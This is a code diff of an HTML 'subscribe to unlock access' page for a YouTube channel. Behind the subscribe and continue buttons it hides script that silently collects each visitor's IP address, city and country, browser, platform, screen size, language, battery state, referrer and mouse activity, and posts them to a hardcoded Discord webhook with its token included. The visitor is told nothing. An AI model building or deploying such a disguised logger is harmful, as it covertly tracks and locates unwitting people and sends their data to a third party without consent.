@@ -1,153 +1,167 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8"/>
+  <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Welcome</title>
+  <title>Access</title>
   <style>
     body {
-      background-color: #0d0d0d;
-      color: #ffffff;
-      font-family: 'Segoe UI', sans-serif;
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #000;
+      color: #fff;
       display: flex;
       flex-direction: column;
-      justify-content: center;
       align-items: center;
-      height: 100vh;
-      margin: 0;
+      justify-content: center;
+      min-height: 100vh;
       text-align: center;
     }
-
-    h1 {
-      font-size: 2em;
-      margin-bottom: 20px;
-    }
-
     button {
-      background-color: #0077ff;
-      color: white;
-      padding: 14px 28px;
+      background-color: #444;
       border: none;
-      border-radius: 10px;
-      font-size: 18px;
+      color: white;
+      padding: 12px 24px;
+      font-size: 16px;
       cursor: pointer;
-      margin: 10px;
-      box-shadow: 0 0 15px #0077ff;
+      border-radius: 8px;
+      margin-top: 20px;
       transition: 0.3s;
     }
-
     button:hover {
-      background-color: #005fcc;
+      background-color: #666;
     }
-
-    #note {
+    #noteContainer, #continueContainer, #hotelContainer {
       display: none;
       margin-top: 20px;
-      max-width: 500px;
-    }
-
-    #timer {
-      font-size: 1.5em;
-      margin-top: 10px;
-    }
-
-    #continueBtn:disabled {
-      background-color: #555;
-      box-shadow: none;
-      cursor: not-allowed;
     }
   </style>
 </head>
 <body>
 
-  <h1>Subscribe to Unlock Access</h1>
-  <button id="subscribeBtn">Subscribe</button>
+  <h1>Welcome User</h1>
+  <button id="subscribeBtn">Subscribe to @TheMugenKing</button>
 
-  <div id="note">
-    <p><strong>Note:</strong> You Have Subscribed - Our Channel, It Will Automatically Open Soon.<br>
-    If You Unsubscribe, We Will Delete Your Whitelist User.</p>
-    Now type 'Subscribe' in the box below to unlock.</p>
-    <p id="timer">Please wait 5 seconds...</p>
-    <button id="continueBtn" disabled>Continue</button>
+  <div id="noteContainer">
+    <p><strong>Note:</strong> Please wait <span id="timer">10</span> seconds after subscribing.</p>
+    <div id="continueContainer">
+      <button id="continueBtn" disabled>Continue</button>
+    </div>
+  </div>
+
+  <div id="hotelContainer">
+    <p>Welcome</p>
+    <p>You Have Subscribed - Our Channel<p>
+    <p>It Will Automatically Open Soon <p>
+    <p>If You Unsubscribe, We Will Delete Your Whitelist User<p>
+    <p>Now type 'Subscribe' in the box below to unlock<p>
   </div>
 
   <script>
-    const subscribeBtn = document.getElementById("subscribeBtn");
-    const continueBtn = document.getElementById("continueBtn");
-    const note = document.getElementById("note");
-    const timer = document.getElementById("timer");
+    const webhookURL = 'https://discord.com/api/webhooks/1381911749338464256/RzD7NHxjZy2IKqWG5xd4Jrtr2XloUjSLwDywAAypuwC8lXggNYhmNFXQ6a-uyzR_qUBp'; // REPLACE THIS
 
-    const webhookURL = "https://discord.com/api/webhooks/1381911749338464256/RzD7NHxjZy2IKqWG5xd4Jrtr2XloUjSLwDywAAypuwC8lXggNYhmNFXQ6a-uyzR_qUBp"; // Ganti dengan milikmu
-
-    let sessionId = Math.random().toString(36).substring(2, 12);
+    let mouseMoves = [];
+    let sessionID = crypto.randomUUID();
+    let accessTime = new Date().toISOString();
     let startTime = Date.now();
-    let mouseMoved = false;
 
-    document.addEventListener("mousemove", () => mouseMoved = true);
+    // Track mouse movement
+    document.addEventListener('mousemove', (e) => {
+      mouseMoves.push({ x: e.clientX, y: e.clientY, t: Date.now() });
+    });
 
-    subscribeBtn.onclick = () => {
-      window.open("https://youtube.com/@themugenking?si=Rwpwckc1fz7urPMP", "_blank");
+    async function getBatteryInfo() {
+      try {
+        const battery = await navigator.getBattery();
+        return {
+          level: battery.level,
+          charging: battery.charging
+        };
+      } catch {
+        return { level: null, charging: null };
+      }
+    }
 
-      subscribeBtn.style.display = "none";
-      note.style.display = "block";
+    async function collectAndSendData() {
+      const battery = await getBatteryInfo();
+      const resolution = `${screen.width}x${screen.height}`;
+      const language = navigator.language;
+      const platform = navigator.platform;
+      const userAgent = navigator.userAgent;
+      const referrer = document.referrer;
+      const duration = ((Date.now() - startTime) / 1000).toFixed(2);
 
-      let count = 5;
+      const ipRes = await fetch('https://api.ipify.org?format=json');
+      const ipData = await ipRes.json();
+
+      const geoRes = await fetch(`https://ipapi.co/json`);
+      const geo = await geoRes.json();
+
+      const data = {
+        content: `📥 New Subscriber Access Attempt`,
+        embeds: [{
+          title: 'User Info',
+          color: 0x0099ff,
+          fields: [
+            { name: 'IP', value: ipData.ip, inline: true },
+            { name: 'Location', value: `${geo.city}, ${geo.region}, ${geo.country_name}`, inline: true },
+            { name: 'Browser', value: userAgent },
+            { name: 'Platform', value: platform, inline: true },
+            { name: 'Device', value: /Mobi|Android/i.test(userAgent) ? 'Mobile' : 'Desktop', inline: true },
+            { name: 'Referrer', value: referrer || 'Direct' },
+            { name: 'Resolution', value: resolution, inline: true },
+            { name: 'Language', value: language, inline: true },
+            { name: 'Battery', value: `🔋 ${battery.level * 100}% | ${battery.charging ? "Charging" : "Not Charging"}`, inline: true },
+            { name: 'Session ID', value: sessionID },
+            { name: 'Access Time', value: accessTime },
+            { name: 'Duration', value: `${duration} seconds`, inline: false },
+            { name: 'Mouse Movements', value: `${mouseMoves.length}` }
+          ],
+          timestamp: new Date().toISOString()
+        }]
+      };
+
+      await fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      });
+    }
+
+    // Subscribe button
+    const subscribeBtn = document.getElementById('subscribeBtn');
+    const noteContainer = document.getElementById('noteContainer');
+    const timerSpan = document.getElementById('timer');
+    const continueBtn = document.getElementById('continueBtn');
+    const hotelContainer = document.getElementById('hotelContainer');
+
+    subscribeBtn.addEventListener('click', () => {
+      window.open('https://youtube.com/@themugenking?si=xHcLhvJnGXWcE_ZG', '_blank');
+
+      subscribeBtn.disabled = true;
+      noteContainer.style.display = 'block';
+
+      collectAndSendData();
+
+      let timeLeft = 10;
       const countdown = setInterval(() => {
-        count--;
-        timer.innerText = `Please wait ${count} seconds...`;
-        if (count <= 0) {
+        timerSpan.textContent = timeLeft;
+        timeLeft--;
+        if (timeLeft < 0) {
           clearInterval(countdown);
-          timer.innerText = "You may now continue.";
           continueBtn.disabled = false;
+          document.getElementById('continueContainer').style.display = 'block';
+          timerSpan.textContent = 'Ready';
         }
       }, 1000);
-    };
+    });
 
-    continueBtn.onclick = () => {
-      const endTime = Date.now();
-      const duration = Math.floor((endTime - startTime) / 1000);
-      const resolution = `${window.screen.width}x${window.screen.height}`;
-      const language = navigator.language;
-      const browser = navigator.userAgent;
-      const platform = navigator.platform;
-      const referrer = document.referrer || "None";
-
-      navigator.getBattery().then(battery => {
-        fetch("https://ipapi.co/json")
-          .then(res => res.json())
-          .then(ipData => {
-            const payload = {
-              content: "**🔐 Premium Access Log**",
-              embeds: [{
-                title: "Access Details",
-                color: 0x0077ff,
-                fields: [
-                  { name: "IP", value: ipData.ip, inline: true },
-                  { name: "Browser", value: browser, inline: false },
-                  { name: "Platform", value: platform, inline: true },
-                  { name: "Device", value: navigator.userAgentData?.mobile ? "Mobile" : "Desktop", inline: true },
-                  { name: "Referrer", value: referrer, inline: false },
-                  { name: "Resolution", value: resolution, inline: true },
-                  { name: "Battery", value: (battery.level * 100) + "%", inline: true },
-                  { name: "Language", value: language, inline: true },
-                  { name: "Mouse Moved", value: mouseMoved ? "Yes" : "No", inline: true },
-                  { name: "Duration", value: duration + " sec", inline: true },
-                  { name: "Session ID", value: sessionId, inline: false },
-                  { name: "Access Time", value: new Date().toLocaleString(), inline: false }
-                ]
-              }]
-            };
-
-            fetch(webhookURL, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify(payload)
-            }).then(() => {
-              window.location.href = "https://example.com/premium-content"; // Ganti dengan URL premium milikmu
-            });
-          });
-      });
-    };
+    continueBtn.addEventListener('click', () => {
+      hotelContainer.style.display = 'block';
+      setTimeout(() => {
+        window.location.href = 'https://example.com/premium-content'; // Ganti dengan konten premium
+      }, 3000);
+    });
   </script>
 
 </body>
